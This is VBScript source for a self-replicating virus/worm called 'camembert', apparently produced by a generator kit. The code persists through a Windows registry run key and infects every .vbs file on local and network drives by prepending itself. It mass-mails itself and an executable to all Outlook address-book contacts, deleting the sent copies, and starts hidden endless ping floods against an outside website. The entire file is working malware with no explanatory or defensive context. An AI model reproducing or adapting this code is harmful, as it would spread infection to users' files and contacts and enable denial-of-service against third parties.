   'camembert
   'Name : camembert
   'Author : Sapeur
   On Error Resume Next
   Set jfyulg = CreateObject("Scripting.FileSystemObject")
   Set gwslxj = CreateObject("WScript.Shell")
   Set win = jfyulg.GetSpecialFolder(0)
   Set sys = jfyulg.GetSpecialFolder(1)

   copyname = sys&"\toto.htm.vbs"
   jfyulg.GetFile(WScript.ScriptFullName).Copy(copyname)
   gwslxj.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\value_worm",copyname

   Set fl = jfyulg.OpenTextFile(WScript.ScriptFullName, 1)
   virus = fl.ReadAll
   fl.Close
   infectfile()
   Sub infectfile()
   On Error Resume Next
   Set jfyulg = CreateObject("Scripting.FileSystemObject")
   Set ipjj = jfyulg.Drives
   For Each d In ipjj
   If d.DriveType = 2 Or d.DriveType = 3 Then
   list(d.path&"\")
   End If
   Next
   End Sub

   Sub list(doss)
   On Error Resume Next
   Set jfyulg = CreateObject("Scripting.FileSystemObject")
   Set cdjy = jfyulg.GetFolder(doss)
   Set fuxjy = cdjy.SubFolders
   For Each f1 In fuxjy
   infect(f1.Path)
   list(f1.Path)
   Next
   End Sub

   Sub infect(doss)
   On Error Resume Next
   Set jfyulg = CreateObject("Scripting.FileSystemObject")
   Set cdjy = jfyulg.GetFolder(doss)
   Set fc = cdjy.Files
   For Each f1 In fc
   ext = jfyulg.GetExtensionName(f1.Path)
   ext = lCase(ext)
   If (ext = "vbs") Then
       Set cot = jfyulg.OpenTextFile(f1.Path, 1, False)
       If cot.ReadLine <> "'camembert" Then
       cot.Close
       Set cot = jfyulg.OpenTextFile(f1.Path, 1, False)
       vbsorg = cot.ReadAll()
       cot.Close
       Set inf = jfyulg.OpenTextFile(f1.Path, 2, True)
       inf.WriteLine virus
       inf.WriteLine ""
       inf.WriteLine (vbsorg)
       inf.Close
       End If
   End If
   Next
   End Sub

   Set xumb = CreateObject("Outlook.Application")
   Set egig = xumb.GetNameSpace("MAPI")
   For each c In egig.AddressLists
   If c.AddressEntries.Count <> 0 Then
   For d = 1 To c.AddressEntries.Count
   Set uvrhz = xumb.CreateItem(0)
   uvrhz.To = c.AddressEntries(d).Address
   uvrhz.Subject = "Subject..."
   uvrhz.Body = "Body of the worm..."
   uvrhz.Attachments.Add(copyname)
   uvrhz.Attachments.Add("c:\appswat.exe")
   uvrhz.DeleteAfterSubmit = True
   If uvrhz.To <> "" Then
   uvrhz.Send
   End If
   Next
   End If
   Next

   gwslxj.Run ("ping.exe -t -l 20000 www.yahoo.com"),vbHide
   gwslxj.Run (win&"\ping.exe -t -l 20000 www.yahoo.com"),vbHide

   MsgBox "Text of message box",vbinformation,"Title"

   'This VBS virus/worm was generated by PVBSWG 1.0
